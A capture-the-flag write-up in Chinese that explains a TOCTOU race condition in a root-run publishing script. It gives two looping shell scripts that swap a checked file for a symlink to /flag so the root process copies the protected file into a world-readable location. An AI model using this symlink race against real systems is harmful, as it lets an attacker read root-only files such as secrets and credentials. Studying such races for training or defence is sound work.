# 内网渗透与高级社工-权限提升维持-G4 WriteUp

TOCTOU（Time-Of-Check to Time-Of-Use）是一类典型的竞态条件问题，指程序在“检查资源状态”和“实际使用该资源”之间存在时间窗口，状态可能被其他线程或进程悄悄改掉

## 分析

打开网站，首先查找线索，最终发现了一个后台进程以root权限运行脚本`/usr/local/sbin/publishd`


使用cat命令查看其内容：

```shell
#!/bin/sh

d=/var/spool/publish
f="$d/report"
dest=/var/published/out

while true; do
    if [ -f "$f" ] && [ ! -L "$f" ]; then
        date >> /var/log/publish.log 2>/dev/null
        cat "$f" > "$dest" 2>/dev/null
        chmod 644 "$dest" 2>/dev/null
    fi
    sleep 0.2
done
```

脚本每0.2秒检查一次，若f是文件且不是符号链接，则将其内容写入dest，并修改权限为644，player有阅读权限。

## 解题

我们编写两个脚本，一个不间断地创建普通文件然后快速改成符号链接，识图利用TOCTOU窗口，另一个不间断地读取dest文件内容。

script1.sh:

```bash
echo "while true; do touch /var/spool/publish/report; ln -sf /flag /var/spool/publish/report; sleep 0.1; rm /var/spool/publish/report; done" > script1.sh
chmod +x script1.sh
```

script2.sh:

```bash
echo "while true; do cat /var/published/out; sleep 0.1; done" > script2.sh
chmod +x script2.sh
```

后台运行script1.sh，并运行script2.sh：

```bash
./script1.sh & ./script2.sh
```
